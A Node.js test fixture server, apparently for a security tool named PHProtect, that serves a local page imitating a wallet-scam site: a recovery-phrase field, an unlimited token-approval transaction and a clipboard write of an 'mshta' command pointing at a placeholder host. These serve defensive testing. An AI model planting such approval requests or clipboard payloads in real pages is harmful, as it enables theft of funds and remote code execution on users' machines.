"use strict";
const http = require("node:http");
function createFixtureServer(logs = []) {
  const fixture = `<!doctype html><html><head><title>PHProtect local test</title></head><body>
<h1>PHProtect local test fixture</h1><p>Inert test data only. No real wallet or recovery phrase.</p>
<label>Recovery phrase <textarea id="seed" aria-label="Recovery phrase"></textarea></label>
<button id="wallet">Test unlimited approval</button><button id="copy">Test clipboard command</button>
<script>
window.forwarded=[];
window.ethereum={request:async function(args){window.forwarded.push(args);return "forwarded"}};
document.getElementById("wallet").onclick=()=>{window.result="pending";ethereum.request({method:"eth_sendTransaction",params:[{to:"0x1111111111111111111111111111111111111111",data:"0x095ea7b3"+"0".repeat(24)+"2222222222222222222222222222222222222222"+"f".repeat(64)}]}).then(v=>window.result=v,e=>window.result=e.code)};
document.getElementById("copy").onclick=()=>navigator.clipboard.writeText("mshta https://example.invalid/inert-test").then(()=>window.copyDone=true);
</script></body></html>`;
  const server = http.createServer((req, res) => {
    logs.push({ method: req.method, url: req.url, cookie: req.headers.cookie || "" });
    if (req.url === "/fallback" && req.method === "HEAD") {
      res.writeHead(405);
      res.end();
      return;
    }
    const headers = { "Content-Type": "text/html; charset=utf-8" };
    if (req.url !== "/unknown")
      headers["X-Powered-By"] = req.url === "/patched" ? "PHP/8.4.27" : "PHP/8.2.34";
    res.writeHead(200, headers);
    res.end(req.method === "HEAD" ? "" : fixture);
  });

  return server;
}
module.exports = { createFixtureServer };
if (require.main === module) {
  const server = createFixtureServer();
  server.listen(3210, "127.0.0.1", () =>
    console.log("Inert PHProtect fixtures: http://127.0.0.1:3210/vulnerable (Ctrl+C to stop)")
  );
}
